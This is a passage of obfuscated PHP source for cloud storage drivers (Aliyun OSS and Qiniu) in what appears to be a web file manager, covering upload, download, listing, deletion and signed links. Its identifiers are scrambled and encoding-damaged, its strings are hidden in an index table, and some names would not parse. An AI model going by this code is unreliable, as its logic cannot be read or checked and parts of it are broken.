$‘Ø§™Ïì); $×ÜÏûğ§ = $this->trafficLimit($ã³¥‹“•[109], $×ÜÏûğ§); $this->client->getObject($this->bucket, $this->pathEncode($ä¡Ñ‹Âı), $×ÜÏûğ§); } catch (OSS\Core\OssException $¯²íã’Ï) { $this->writeLog(__FUNCTION__ . $ã³¥‹“•[212] . $¯²íã’Ï->getMessage()); return !1; } return $‘Ø§™Ïì; } public function fileSubstr($çùşá’Õ, $ßÉ²©ù‰ = 0, $çÖ·ñƒ = false) { if ($ßÉ²©ù‰ === -1) { $§î˜ÃÙ× = array(); } else { if ($çÖ·ñƒ === !1) { $×¶—ºƒ = $this->size($çùşá’Õ); } else { $×¶—ºƒ = $ßÉ²©ù‰ + $çÖ·ñƒ - 1; } $§î˜ÃÙ× = array(OSS\OssClient::OSS_RANGE => "{$ßÉ²©ù‰}\55{$×¶—ºƒ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($çùşá’Õ), $§î˜ÃÙ×); } catch (OSS\Core\OssException $¸çü†Ş¨) { $this->writeLog(__FUNCTION__ . $_SERVER[ïÃ°£«Ê][212] . $¸çü†Ş¨->getMessage()); think_exception($¸çü†Ş¨->getMessage()); return !1; } } private function trafficLimit($Ö¦éİ…—, $Éúƒ‚ú¥ = array(), $ñ™æ¬¥› = false) { $ù§§·Ã =& $_SERVER[ïÃ°£«Ê]; if ($Ö¦éİ…— == $ù§§·Ã[1696] && $this->isUploadServer() || $Ö¦éİ…— == $ù§§·Ã[109] && $this->isFileOutServer()) { return $Éúƒ‚ú¥; } $è¼ì‚ùü = floatval($GLOBALS[$ù§§·Ã[6]][$ù§§·Ã[92]][$ù§§·Ã[107]][$Ö¦éİ…—]) * 1024 * 1024 * 8; if (!$è¼ì‚ùü) { return $Éúƒ‚ú¥; } $è¼ì‚ùü = $è¼ì‚ùü < 819200 ? 819200 : ($è¼ì‚ùü > 838860800 ? 838860800 : $è¼ì‚ùü); if ($ñ™æ¬¥›) { $Éúƒ‚ú¥[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($è¼ì‚ùü); } else { if (!isset($Éúƒ‚ú¥[OSS\OssClient::OSS_HEADERS])) { $Éúƒ‚ú¥[OSS\OssClient::OSS_HEADERS] = array(); } $Éúƒ‚ú¥[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($è¼ì‚ùü); } return $Éúƒ‚ú¥; } public function link($¸şæ±äø, $ªŒğæŸ£ = array()) { $ê¼ß¼Ş =& $_SERVER[ïÃ°£«Ê]; if (!$this->exist($¸şæ±äø) || $this->isFolder($¸şæ±äø)) { return !1; } try { $ªŒğæŸ£ = $this->trafficLimit($ê¼ß¼Ş[109], $ªŒğæŸ£, !0); $ùÉ³¶Îà = $this->client->signUrl($this->bucket, $this->pathEncode($¸şæ±äø), 3600 * 12, $ê¼ß¼Ş[1607], $ªŒğæŸ£); return $this->getCdnLink($ùÉ³¶Îà); } catch (OSS\Core\OssException $âí›˜´«) { $this->writeLog(__FUNCTION__ . $ê¼ß¼Ş[212] . $âí›˜´«->getMessage()); return !1; } } public function fileOut($»¨Èå», $Í‡«–¢” = false, $ÀóöóñÓ = false, $ñÂ¼ÌšÌ = '') { $ŠûÓá¬Ô =& $_SERVER[ïÃ°£«Ê]; if ($this->isFileOutServer()) { return $this->fileOutServer($»¨Èå», $Í‡«–¢”, $ÀóöóñÓ, $ñÂ¼ÌšÌ); } if (!$ÀóöóñÓ) { $ÀóöóñÓ = $this->pathThis($»¨Èå»); } $ÀóöóñÓ = rawurlencode($ÀóöóñÓ); $Æùªï¼î = get_file_mime(get_path_ext($ÀóöóñÓ)); if ($Æùªï¼î == $ŠûÓá¬Ô[248]) { return parent::fileOut($»¨Èå», $Í‡«–¢”, $ÀóöóñÓ, $ñÂ¼ÌšÌ); } $Í‡«–¢” = $Í‡«–¢” ? $ŠûÓá¬Ô[1705] : $ŠûÓá¬Ô[1706]; $ï‹ëØÈ… = array(OSS\OssClient::OSS_SUB_RESOURCE => $ŠûÓá¬Ô[1707] . rawurlencode("{$Í‡«–¢”}\x3b\x66\x69\154\145\156\141\x6d\145\75{$ÀóöóñÓ}")); $ç³—Õ¢´ = $this->link($»¨Èå», $ï‹ëØÈ…); $this->fileOutLink($ç³—Õ¢´); } public function fileOutServer($¤“‡Åóº, $“ÁáÇ´— = false, $×ô¨šä = false, $ïÏâšŸÔ = '') { parent::fileOut($¤“‡Åóº, $“ÁáÇ´—, $×ô¨šä, $ïÏâšŸÔ); } public function fileOutImage($¨¤œæ¹, $üã€šÃ¥ = 250) { if ($this->size($¨¤œæ¹) > 1024 * 1024 * 20) { return $this->fileOutImageServer($¨¤œæ¹, $üã€šÃ¥); } $¦»¶» = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ïÃ°£«Ê][1670] . $üã€šÃ¥); $†½„èŸ¾ = $this->link($¨¤œæ¹, $¦»¶»); $this->fileOutLink($†½„èŸ¾); } public function fileOutImageServer($Ã“ÑêÏ, $£úÜ¶Ëİ = 250) { parent::fileOutImage($Ã“ÑêÏ, $£úÜ¶Ëİ); } public function fileOutLink($’¼Ê­‚) { $¨™†õû¯ =& $_SERVER[ïÃ°£«Ê]; if (!$this->isCdnHost() && substr($’¼Ê­‚, 0, 7) == $¨™†õû¯[216]) { $’¼Ê­‚ = $¨™†õû¯[217] . substr($’¼Ê­‚, 7); } header($¨™†õû¯[172] . $’¼Ê­‚); die; } public function hashMd5($À¾øàÂ•, $òáÖ“ƒä = '') { $Ë„ğòûï =& $_SERVER[ïÃ°£«Ê]; $’Åı²°© = $this->_objectMeta($À¾øàÂ•); if (!$’Åı²°©) { return $Ë„ğòûï[12]; } if (!isset($’Åı²°©[$Ë„ğòûï[1690]]) && !empty($òáÖ“ƒä)) { $œá¬– = $this->updateObjMeta($À¾øàÂ•, array($Ë„ğòûï[1690] => $òáÖ“ƒä)); $’Åı²°©[$Ë„ğòûï[1690]] = $œá¬– ? $òáÖ“ƒä : $Ë„ğòûï[12]; } return isset($’Åı²°©[$Ë„ğòûï[1690]]) ? strtolower($’Åı²°©[$Ë„ğòûï[1690]]) : $Ë„ğòûï[12]; } public function size($éŠ‚€İ) { $º¦¼©İŸ = $this->objectMeta($éŠ‚€İ); return $º¦¼©İŸ ? $º¦¼©İŸ[$_SERVER[ïÃ°£«Ê][79]] : 0; } public function info($óéöŒ„Š) { if ($this->isFolder($óéöŒ„Š)) { return $this->folderInfo($óéöŒ„Š); } else { if ($this->isFile($óéöŒ„Š)) { return $this->fileInfo($óéöŒ„Š); } } return !1; } public function exist($çôåÀ®™) { return $this->isFile($çôåÀ®™) || $this->isFolder($çôåÀ®™); } public function isFile($ööÅÛ¸‡) { return !$this->isFolder($ööÅÛ¸‡) && $this->objectMeta($ööÅÛ¸‡); } public function isFolder($Üô©ØÏ«) { return $this->cacheMethod($_SERVER[ïÃ°£«Ê][177], $Üô©ØÏ«); } protected function objectMeta($ò¿È¾Ë„) { return $this->cacheMethod($_SERVER[ïÃ°£«Ê][179], $ò¿È¾Ë„); } protected function _objectMeta($”°éÛøÑ) { $š¬äÖñ‘ =& $_SERVER[ïÃ°£«Ê]; try { $ÓØÕÌ©Å = $this->client->getObjectMeta($this->bucket, $this->pathEncode($”°éÛøÑ)); } catch (OSS\Core\OssException $Ó„¹Ñ‹¶) { $this->writeLog(__FUNCTION__ . $š¬äÖñ‘[212] . $Ó„¹Ñ‹¶->getMessage()); $ÓØÕÌ©Å = !1; } if ($ÓØÕÌ©Å) { $ÓØÕÌ©Å[$š¬äÖñ‘[79]] = intval($ÓØÕÌ©Å[$š¬äÖñ‘[1688]]); } return $ÓØÕÌ©Å; } protected function _isFolder($ûæ²”—Œ) { $§òïÊ¥” =& $_SERVER[ïÃ°£«Ê]; if ($ûæ²”—Œ == $§òïÊ¥”[12] || $ûæ²”—Œ == $§òïÊ¥”[8]) { return !0; } $ÑÀ¡¤õé = array($§òïÊ¥”[1683] => $§òïÊ¥”[8], $§òïÊ¥”[1684] => rtrim($ûæ²”—Œ, $§òïÊ¥”[8]) . $§òïÊ¥”[8], $§òïÊ¥”[1685] => 1, $§òïÊ¥”[1686] => $§òïÊ¥”[12]); $’ÃôË„æ = $this->client->listObjects($this->bucket, $ÑÀ¡¤õé); if ($’ÃôË„æ->getObjectList() || $’ÃôË„æ->getPrefixList()) { return !0; } return !1; } public function writeLog($½É—¿•ê = '', $ìˆ—·¹‘ = false) { $±Ã¥ÅŒÙ =& $_SERVER[ïÃ°£«Ê]; $¬€Ë¨€€ = in_array(ACTION, array($±Ã¥ÅŒÙ[210], $±Ã¥ÅŒÙ[211])); if (!$¬€Ë¨€€ && !GLOBAL_DEBUG) { return; } $îßøù•» = 0; if (stripos($½É—¿•ê, $±Ã¥ÅŒÙ[1708]) !== !1) { $îßøù•» = 1; $şÂ®÷€ñ = explode($±Ã¥ÅŒÙ[1709], $½É—¿•ê); $½É—¿•ê = !empty($şÂ®÷€ñ[1]) ? $şÂ®÷€ñ[1] : $½É—¿•ê; } else { if (stripos($½É—¿•ê, $±Ã¥ÅŒÙ[1710])) { $îßøù•» = 2; $şÂ®÷€ñ = explode($±Ã¥ÅŒÙ[1710], $½É—¿•ê); $şÂ®÷€ñ = explode($±Ã¥ÅŒÙ[4], $şÂ®÷€ñ[0]); $½É—¿•ê = !empty($şÂ®÷€ñ[1]) ? $şÂ®÷€ñ[1] : $½É—¿•ê; } } if ($¬€Ë¨€€ && I18n::getType() == $±Ã¥ÅŒÙ[1711]) { if ($îßøù•» == 1) { $½É—¿•ê = str_replace($±Ã¥ÅŒÙ[1712], $±Ã¥ÅŒÙ[1713], $½É—¿•ê); } else { if ($îßøù•» == 2) { $şÂ®÷€ñ = explode($±Ã¥ÅŒÙ[212], $şÂ®÷€ñ[0]); $÷º°ãûÙ = isset($şÂ®÷€ñ[1]) ? $şÂ®÷€ñ[1] : $±Ã¥ÅŒÙ[12]; $ıœ°Å÷ = array($±Ã¥ÅŒÙ[1714] => $±Ã¥ÅŒÙ[1715], $±Ã¥ÅŒÙ[1716] => $±Ã¥ÅŒÙ[1717], $±Ã¥ÅŒÙ[1718] => $±Ã¥ÅŒÙ[1719], $±Ã¥ÅŒÙ[1720] => $±Ã¥ÅŒÙ[1721], $±Ã¥ÅŒÙ[1722] => $±Ã¥ÅŒÙ[1723], $±Ã¥ÅŒÙ[1724] => $±Ã¥ÅŒÙ[1725], $±Ã¥ÅŒÙ[1726] => $±Ã¥ÅŒÙ[1727], $±Ã¥ÅŒÙ[1728] => $±Ã¥ÅŒÙ[1729], $±Ã¥ÅŒÙ[1730] => $±Ã¥ÅŒÙ[1731], $±Ã¥ÅŒÙ[1732] => $±Ã¥ÅŒÙ[1733]); if (isset($ıœ°Å÷[$÷º°ãûÙ])) { $½É—¿•ê = $ıœ°Å÷[$÷º°ãûÙ]; } } } if (stripos($½É—¿•ê, $±Ã¥ÅŒÙ[1734])) { $½É—¿•ê = $±Ã¥ÅŒÙ[1735]; } } if (!trim($½É—¿•ê)) { return; } parent::writeLog(trim($½É—¿•ê), $ìˆ—·¹‘); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($×¤€ óˆ) { parent::__construct(); require_once SDK_DIR . $_SERVER[ïÃ°£«Ê][1736]; $this->_init($×¤€ óˆ); } public function _init($Âšëâ„Ç) { $ùï¨çîÙ =& $_SERVER[ïÃ°£«Ê]; $this->config = $Âšëâ„Ç; foreach ($Âšëâ„Ç as $ñÉÜ¨ºÙ => $éïı»Ğ½) { if (isset($this->{$ñÉÜ¨ºÙ})) { $this->{$ñÉÜ¨ºÙ} = $éïı»Ğ½; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ùï¨çîÙ[1737] . LNG($ùï¨çîÙ[1674])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($„šŸ£ÌØ, $ø‡‘à¨Ü = '', $¦æœ×¡ = REPEAT_RENAME) { if ($this->setContent($„šŸ£ÌØ, $ø‡‘à¨Ü)) { return $this->getPathOuter($„šŸ£ÌØ); } return !1; } public function mkdir($Ëß½è³, $´¿£Ö¥¨ = REPEAT_SKIP) { $ø¹¶Ô‹Û =& $_SERVER[ïÃ°£«Ê]; $‘ÁëŸ• = trim($Ëß½è³, $ø¹¶Ô‹Û[8]); if ($this->_isFolder($‘ÁëŸ•)) { return $this->getPathOuter($‘ÁëŸ•); } $Ëß½è³ = $‘ÁëŸ• . $ø¹¶Ô‹Û[8]; $ëøæ‚Ÿİ = get_path_this($‘ÁëŸ•); $×Œ„Üˆö = $Ëß½è³ . $ëøæ‚Ÿİ; if (!$this->mkfile($×Œ„Üˆö)) { return !1; } if (!$this->moveFile($×Œ„Üˆö, $Ëß½è³)) { $this->delFile($×Œ„Üˆö); return !1; } return $this->getPathOuter($‘ÁëŸ•); } public function copyFile($›Ûß¿—ı, $ş£ñĞˆ´) { $ïÜñ¬ŒÏ = $this->bucketManager->copy($this->bucket, $›Ûß¿—ı, $this->bucket, $ş£ñĞˆ´, !0); return $ïÜñ¬ŒÏ ? !1 : $this->getPathOuter($ş£ñĞˆ´); } public function moveFile($Ğ¾¶‹ƒ , $²ï¥í¾) { $Ñ¿¯õÆ¾ = $this->bucketManager->move($this->bucket, $Ğ¾¶‹ƒ , $this->bucket, $²ï¥í¾, !0); return $Ñ¿¯õÆ¾ ? !1 : $this->getPathOuter($²ï¥í¾); } public function delFile($›ˆ€…³«) { if (!$this->exist($›ˆ€…³«)) { return !0; } $Ô•Ïñß = $this->bucketManager->delete($this->bucket, $›ˆ€…³«); if (!$Ô•Ïñß) { return !0; } return $Ô•Ïñß->code() == 612 ? !0 : !1; } public function delFolder($–‚¿µ¢) { $Åê”ñ¼µ =& $_SERVER[ïÃ°£«Ê]; if (!$this->exist($–‚¿µ¢)) { return !0; } $this->listItemCache = !1; $ÇßÏ‡Ç„ = $this->fileList($–‚¿µ¢); $this->listItemCache = !0; $‹ö¡şí = trim($–‚¿µ¢, $Åê”ñ¼µ[8]) . $Åê”ñ¼µ[8]; if (!empty($–‚¿µ¢) && $–‚¿µ¢ !== $Åê”ñ¼µ[228] && !in_array($‹ö¡şí, $ÇßÏ‡Ç„[$Åê”ñ¼µ[85]])) { $ÇßÏ‡Ç„[$Åê”ñ¼µ[85]][] = $‹ö¡şí; } $Õ©ë…ìê = $this->delByBatch($ÇßÏ‡Ç„[$Åê”ñ¼µ[86]]); if (!$Õ©ë…ìê) { return !1; } $Õ©ë…ìê = $this->delByBatch($ÇßÏ‡Ç„[$Åê”ñ¼µ[85]]); if (!$Õ©ë…ìê) { return !1; } return $this->delFile($‹ö¡şí); } private function delByBatch($ù–Á­İì) { foreach (array_chunk($ù–Á­İì, 1000) as $ÈÃÙÔ½å) { $¢³ôı×¬ = $this->bucketManager->buildBatchDelete($this->bucket, $ÈÃÙÔ½å); list($Æœ­×ˆ, $Ó­²ì–§) = $this->bucketManager->batch($¢³ôı×¬); if ($Ó­²ì–§) { return !1; } } return !0; } public function rename($³á§õ•Ü, $ùÂğ‹‡İ) { return $this->renameObject($³á§õ•Ü, $ùÂğ‹‡İ); } public function fileInfo($‰Ï’Â‚¹, $Ş«ÜÜÀÃ = false, $Ò¸åº÷È = array()) { $öÑÈª½Î =& $_SERVER[ïÃ°£«Ê]; $šì˜óÚÔ = array($öÑÈª½Î[32] => $this->pathThis($‰Ï’Â‚¹), $öÑÈª½Î[87] => $this->getPathOuter($öÑÈª½Î[8] . $‰Ï’Â‚¹), $öÑÈª½Î[33] => $öÑÈª½Î[230], $öÑÈª½Î[79] => isset($Ò¸åº÷È[$öÑÈª½Î[1738]]) ? $Ò¸åº÷È[$öÑÈª½Î[1738]] : 0, $öÑÈª½Î[166] => $this->ext($‰Ï’Â‚¹)); if ($Ş«ÜÜÀÃ) { return $šì˜óÚÔ; } $šì˜óÚÔ[$öÑÈª½Î[231]] = $šì˜óÚÔ[$öÑÈª½Î[88]] = 0; $šì˜óÚÔ[$öÑÈª½Î[232]] = $šì˜óÚÔ[$öÑÈª½Î[233]] = !0; if (empty($Ò¸åº÷È)) { $Ò¸åº÷È = $this->objectMeta($‰Ï’Â‚¹); if (!$Ò¸åº÷È) { return $šì˜óÚÔ; } } if (isset($Ò¸åº÷È[$öÑÈª½Î[234]]) && $Ò¸åº÷È[$öÑÈª½Î[234]]) { $šì˜óÚÔ[$öÑÈª½Î[235]] = $Ò¸åº÷È[$öÑÈª½Î[234]]; } if (isset($Ò¸åº÷È[$öÑÈª½Î[245]]) && $Ò¸åº÷È[$öÑÈª½Î[245]]) { $šì˜óÚÔ[$öÑÈª½Î[235]] = $Ò¸åº÷È[$öÑÈª½Î[245]]; } if (isset($Ò¸åº÷È[$öÑÈª½Î[1739]])) { $šì˜óÚÔ[$öÑÈª½Î[88]] = substr($Ò¸åº÷È[$öÑÈª½Î[1739]] . $öÑÈª½Î[12], 0, 10); } if (isset($Ò¸åº÷È[$öÑÈª½Î[1738]])) { $šì˜óÚÔ[$öÑÈª½Î[79]] = $Ò¸åº÷È[$öÑÈª½Î[1738]]; } return $šì˜óÚÔ; } public function folderInfo($éºˆ×ı, $§ëíÒ…ä = false) { $àïõ­ û =& $_SERVER[ïÃ°£«Ê]; $™ö çÛ = array($àïõ­ û[32] => $this->pathThis($éºˆ×ı), $àïõ­ û[87] => $this->getPathOuter($àïõ­ û[8] . $éºˆ×ı), $àïõ­ û[33] => $àïõ­ û[78]); if ($§ëíÒ…ä) { return $™ö çÛ; } $™ö çÛ[$àïõ­ û[231]] = $™ö çÛ[$àïõ­ û[88]] = 0; $™ö çÛ[$àïõ­ û[232]] = $™ö çÛ[$àïõ­ û[233]] = !0; $éºˆ×ı = rtrim($éºˆ×ı, $àïõ­ û[8]) . $àïõ­ û[8]; $ö¸½¹Ä½ = $this->objectMeta($éºˆ×ı); if (isset($ö¸½¹Ä½[$àïõ­ û[1739]])) { $™ö çÛ[$àïõ­ û[88]] = substr($ö¸½¹Ä½[$àïõ­ û[1739]] . $àïõ­ û[12], 0, 10); } return $™ö çÛ; } public function listPath($œÆìŠ–Ç, $„Ä®Úİç = false) { $–øÙî‘ø =& $_SERVER[ïÃ°£«Ê]; $³€‰Í¢À = $this->fileList($œÆìŠ–Ç, $–øÙî‘ø[8], !0); foreach ($³€‰Í¢À[$–øÙî‘ø[85]] as $·¼¥¸— => $×Ëº¤º½) { $³€‰Í¢À[$–øÙî‘ø[85]][$·¼¥¸—] = $this->folderInfo($×Ëº¤º½, $„Ä®Úİç); } foreach ($³€‰Í¢À[$–øÙî‘ø[86]] as $·¼¥¸— => $×Ëº¤º½) { $³€‰Í¢À[$–øÙî‘ø[86]][$·¼¥¸—] = $this->fileInfo($×Ëº¤º½[$–øÙî‘ø[32]], $„Ä®Úİç, $×Ëº¤º½); } return $³€‰Í¢À; } public function has($”×„‰­¸, $¨òÀ«ùß = false, $ä¾û²à¾ = true) { $â§€è‘¶ =& $_SERVER[ïÃ°£«Ê]; $”×„‰­¸ = trim($”×„‰­¸, $â§€è‘¶[8]); $Òšë‰šø = empty($”×„‰­¸) && $”×„‰­¸ !== $â§€è‘¶[228] ? $â§€è‘¶[12] : $”×„‰­¸ . $â§€è‘¶[8]; $µşÖı¯ = $â§€è‘¶[12]; $ß‰½íÚÚ = 500; $ßã½ç†Ó = $â§€è‘¶[8]; $€ì§Ù¬æ = $Ïóõ­ƒŞ = 0; while (!0) { check_abort(); list($¡Ÿ•¡¾, $Ìç”ÓÊõ) = $this->bucketManager->listFiles($this->bucket, $Òšë‰šø, $µşÖı¯, $ß‰½íÚÚ, $ßã½ç†Ó); if ($Ìç”ÓÊõ) { break; } $µşÖı¯ = array_key_exists($â§€è‘¶[1686], $¡Ÿ•¡¾) ? $µşÖı¯ = $¡Ÿ•¡¾[$â§€è‘¶[1740]] : $â§€è‘¶[12]; if ($¨òÀ«ùß) { if (!empty($¡Ÿ•¡¾[$â§€è‘¶[1741]])) { $€ì§Ù¬æ += count($¡Ÿ•¡¾[$â§€è‘¶[1741]]); } if (!empty($¡Ÿ•¡¾[$â§€è‘¶[1742]])) { $Ïóõ­ƒŞ += count($¡Ÿ•¡¾[$â§€è‘¶[1742]]); } if ($µşÖı¯ === $â§€è‘¶[12]) { break; } continue; } if ($ä¾û²à¾) { if (!empty($¡Ÿ•¡¾[$â§€è‘¶[1741]])) { return !0; } } else { if (!empty($¡Ÿ•¡¾[$â§€è‘¶[1742]])) { return !0; } } if ($µşÖı¯ === $â§€è‘¶[12]) { break; } } if ($¨òÀ«ùß) { return array($â§€è‘¶[239] => $€ì§Ù¬æ, $â§€è‘¶[240] => $Ïóõ­ƒŞ); } return !1; } public function listAll($÷®§ú›) { $Áïš™ŒÇ =& $_SERVER[ïÃ°£«Ê]; $¶é ¹‚Å = $this->fileList($÷®§ú›, $Áïš™ŒÇ[12], !0); $ëäŒÁ”œ = array_to_keyvalue($¶é ¹‚Å[$Áïš™ŒÇ[86]], $Áïš™ŒÇ[32]); foreach ($¶é ¹‚Å[$Áïš™ŒÇ[85]] as $“Œó¬‹ê) { if (is_string($“Œó¬‹ê)) { $ëäŒÁ”œ[$“Œó¬‹ê] = array($Áïš™ŒÇ[79] => 0); } } return $this->listAllFiles($÷®§ú›, $ëäŒÁ”œ); } private function fileList($şš™Ç, $ãŞè˜è = '', $´ã ô¦ = 0) { $ëÄˆ€Í‡ =& $_SERVER[ïÃ°£«Ê]; $şš™Ç = trim($şš™Ç, $ëÄˆ€Í‡[8]); $´¼ÏÃö = empty($şš™Ç) && $şš™Ç !== $ëÄˆ€Í‡[228] ? $ëÄˆ€Í‡[12] : $şš™Ç . $ëÄˆ€Í‡[8]; $áøÒÁ÷£ = $ëÄˆ€Í‡[12]; $ûÏ‡Ğ Ã = 1000; $´ƒª¢ôö = $Ğ¤±ş„ = array(); while (!0) { check_abort(); list($Ÿà“—«‘, $üÚ“§ø) = $this->bucketManager->listFiles($this->bucket, $´¼ÏÃö, $áøÒÁ÷£, $ûÏ‡Ğ Ã, $ãŞè˜è); if ($üÚ“§ø) { break; } $áøÒÁ÷£ = array_key_exists($ëÄˆ€Í‡[1686], $Ÿà“—«‘) ? $áøÒÁ÷£ = $Ÿà“—«‘[$ëÄˆ€Í‡[1740]] : $ëÄˆ€Í‡[12]; $•Í·…¤ = isset($Ÿà“—«‘[$ëÄˆ€Í‡[1741]]) ? $Ÿà“—«‘[$ëÄˆ€Í‡[1741]] : array(); $Ÿ Å¢² = isset($Ÿà“—«‘[$ëÄˆ€Í‡[1742]]) ? $Ÿà“—«‘[$ëÄˆ€Í‡[1742]] : array(); foreach ($•Í·…¤ as $½Û¨ï») { if ($½Û¨ï»[$ëÄˆ€Í‡[95]] == $´¼ÏÃö) { continue; } $ü·ûÊ’İ = $½Û¨ï»[$ëÄˆ€Í‡[95]]; $ËûÜøşİ = $½Û¨ï»[$ëÄˆ€Í‡[1738]]; $½Û¨ï»[$ëÄˆ€Í‡[32]] = $ü·ûÊ’İ; $½Û¨ï»[$ëÄˆ€Í‡[79]] = $ËûÜøşİ; $üì·ºµ› = $ËûÜøşİ == 0 && substr($ü·ûÊ’İ, strlen($ü·ûÊ’İ) - 1, 1) == $ëÄˆ€Í‡[8] ? !0 : !1; $this->cacheMethodInfoSet($ü·ûÊ’İ, $üì·ºµ›, $½Û¨ï»); if ($üì·ºµ›) { $´ƒª¢ôö[] = $ü·ûÊ’İ; continue; } $Ğ¤±ş„[] = $´ã ô¦ ? $½Û¨ï» : $ü·ûÊ’İ; } foreach ($Ÿ Å¢² as $ü·ûÊ’İ) { if ($ü·ûÊ’İ == $´¼ÏÃö) { continue; } $´ƒª¢ôö[] = $ü·ûÊ’İ; $this->cacheMethodInfoSet($ü·ûÊ’İ, !0); } if ($áøÒÁ÷£ === $ëÄˆ€Í‡[12]) { break; } } $this->cacheMethodInfoSet($şš™Ç, !0); return array($ëÄˆ€Í‡[85] => $´ƒª¢ôö, $ëÄˆ€Í‡[86] => $Ğ¤±ş„); } public function canRead($ÛÆ·‚ğ©) { return $this->exist($ÛÆ·‚ğ©) ? !0 : !1; } public function canWrite($ôü´¦š) { return $this->exist($ôü´¦š) ? !0 : !1; } public function getContent($ñ¯–€ã£) { return $this->fileSubstr($ñ¯–€ã£, 0, -1); } public function setContent($îÕ²‚µŠ, $Ç”ÂïÌ• = '') { $ÀƒÙˆ¸¨ = $this->tempFile($this->pathThis($îÕ²‚µŠ)); file_put_contents($ÀƒÙˆ¸¨, $Ç”ÂïÌ•); if ($this->upload($îÕ²‚µŠ, $ÀƒÙˆ¸¨)) { $this->tempFileRemve($ÀƒÙˆ¸¨); return !0; } return !1; } public function refreshUrls($Şƒôê½) { $¼Îòö† =& $_SERVER[ïÃ°£«Ê]; $’÷’ªÔı = array(); if (is_array($Şƒôê½)) { foreach ($Şƒôê½ as $¿æŸéù) { $’÷’ªÔı[] = $this->link($¿æŸéù); } } else { $’÷’ªÔı[] = $this->link($Şƒôê½); } $¯¤ÅˆŠÚ = new Qiniu\Cdn\CdnManager($this->auth); list($Ñ¡¤ğ×›, $îµ•´Ûú) = $¯¤ÅˆŠÚ->refreshUrls($’÷’ªÔı); if ($îµ•´Ûú) { return !1; } return $Ñ¡¤ğ×›[$¼Îòö†[1373]] == $¼Îòö†[861] ? !0 : !1; } public function fileSubstr($ËÍÄŸ¸«, $·ëÊ½á, $ñâğÖñ ) { $§‰ÖËú¥ =& $_SERVER[ïÃ°£«Ê]; if (!($˜õ¤¯÷” = $this->link($ËÍÄŸ¸«))) { return !1; } $áç†£­ó = !1; if ($ñâğÖñ  > 0) { $Å—ÒƒÓÙ = $·ëÊ½á + $ñâğÖñ  - 1; $áç†£­ó = array($§‰ÖËú¥[1606] . $·ëÊ½á . $§‰ÖËú¥[476] . $Å—ÒƒÓÙ); } $ç®óö¢³ = url_request($˜õ¤¯÷”, $§‰ÖËú¥[1607], !1, $áç†£­ó); return $ç®óö¢³[$§‰ÖËú¥[851]] ? $ç®óö¢³[$§‰ÖËú¥[1394]] : !1; } public function upload($£„ü›¬Ä, $¿ë«™“Ü, $·á¸¸Ï = false, $ã³Áö²à = REPEAT_REPLACE) { if (!$¿ë«™“Ü || !@file_exists($¿ë«™“Ü)) { return !1; } $ƒÀâ¹Ë· = new Qiniu\Storage\UploadManager(); $´÷õ‡Ÿ = $this->auth->uploadToken($this->bucket, $£„ü›¬Ä); $êÔŸ¸Ô = get_file_mime(get_path_ext($¿ë«™“Ü)); list($Ë¤‹Šê¦, $Øš“„‚ê) = $ƒÀâ¹Ë·->putFile($´÷õ‡Ÿ, $£„ü›¬Ä, $¿ë«™“Ü, null, $êÔŸ¸Ô); return $Øš“„‚ê ? !1 : $this->getPathOuter($£„ü›¬Ä); } public function uploadFormData($›¿©ƒ˜ª, $ÆÀ¡¯×ò = 3600) { return $this->uploadToken($›¿©ƒ˜ª, $ÆÀ¡¯×ò); } public function uploadMultiData($åù¶Ãä, $ß÷ô‰‰ = 3600) { return $this->uploadToken($åù¶Ãä, $ß÷ô‰‰); } private function uploadToken($ËÃ°Â¦È, $«Ò˜‹â = 3600) { $¯×ÒÆ³ =& $_SERVER[ïÃ°£«Ê]; $ÚĞ„ÄãŸ = $«Ò˜‹â; $ª¶š‡ƒ = array($¯×ÒÆ³[1743] => $¯×ÒÆ³[1744]); $ÙäÛİÊ˜ = $ËÃ°Â¦È; $™°¡›éÒ = $this->auth->uploadToken($this->bucket, $ÙäÛİÊ˜, $ÚĞ„ÄãŸ, $ª¶š‡ƒ, !0); $¦ºé¯ñ = empty($this->region) || $this->region == $¯×ÒÆ³[1745] ? $¯×ÒÆ³[12] : $¯×ÒÆ³[476] . $this->region; $ÆÈË¦ò… = http_type() . "\x3a\57\x2f\165\160\x6c\x6f\141\x64{$¦ºé¯ñ}\56\x71\151\x6e\151\x75\160\56\x63\x6f\155\x2f"; return array($¯×ÒÆ³[1746] => $™°¡›éÒ, $¯×ÒÆ³[1609] => $ÆÈË¦ò…); } public function download($Š¢Ô‚ÏŸ, $°»¡¹ó‚) { $İ™‹À¸¬ = IO::getPathInner(IO::mkfile($°»¡¹ó‚)); if (!($Ùœ÷Ì¨ = $this->link($Š¢Ô‚ÏŸ))) { return !1; } $Æòèà = 0; $Ú¹üñ¥º = 1024 * 200; $©Õ†ÑÑ = fopen($İ™‹À¸¬, $_SERVER[ïÃ°£«Ê][1747]); while (!0) { $–Úù‚ûÈ = $this->fileSubstr($Š¢Ô‚ÏŸ, $Æòèà, $Ú¹üñ¥º); if ($–Úù‚ûÈ === !1) { return !1; } fwrite($©Õ†ÑÑ, $–Úù‚ûÈ); $Æòèà += $Ú¹üñ¥º; if (strlen($–Úù‚ûÈ) < $Ú¹üñ¥º) { break; } } fclose($©Õ†ÑÑ); return $°»¡¹ó‚; } public function link($œÉ¢¦ô¦, $°­ÆãÌû = '') { if (!$this->isFile($œÉ¢¦ô¦)) { return !1; } $Õ¬¥ºöí = $this->getHost() . $_SERVER[ïÃ°£«Ê][8] . $this->pathEncode($œÉ¢¦ô¦) . $°­ÆãÌû; return $this->auth->privateDownloadUrl($Õ¬¥ºöí, 3600 * 12); } public function fileOut($­¾âëíî, $áÄ˜ã¡Ğ = false, $İë«œ·Õ = false, 